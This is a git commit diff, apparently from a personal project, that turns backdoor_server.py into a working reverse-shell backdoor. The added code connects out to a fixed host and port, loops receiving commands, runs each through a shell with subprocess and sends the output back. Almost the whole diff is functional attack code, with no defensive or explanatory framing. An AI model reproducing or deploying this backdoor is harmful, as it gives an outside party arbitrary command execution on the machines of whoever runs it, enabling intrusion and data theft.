ee027f9a2ae308a2f9abb7f7b539b17386cac9a7
Radeonares32 <bugra.linux.js@gmail.com>
2022-08-22 14:50:48 +0300

    command execution

--- backdoor_server.py
+++ backdoor_server.py
@@ -1,11 +1,19 @@
 import socket
+import subprocess
 
-backdoor_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-backdoor_listener.connect(("192.168.8.111",8080))
+def command_execution(command):
+    return subprocess.check_output(command, shell=True)
+
+
+backdoor_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+backdoor_listener.connect(("192.168.8.111", 8080))
 backdoor_listener.send(("Hello World\n").encode())
 
-command = backdoor_listener.recv()
-
+while True:
+    command = backdoor_listener.recv(1024)  # byte
+    cmd = command_execution(command)
+    backdoor_listener.send(cmd)
 
 backdoor_listener.close()
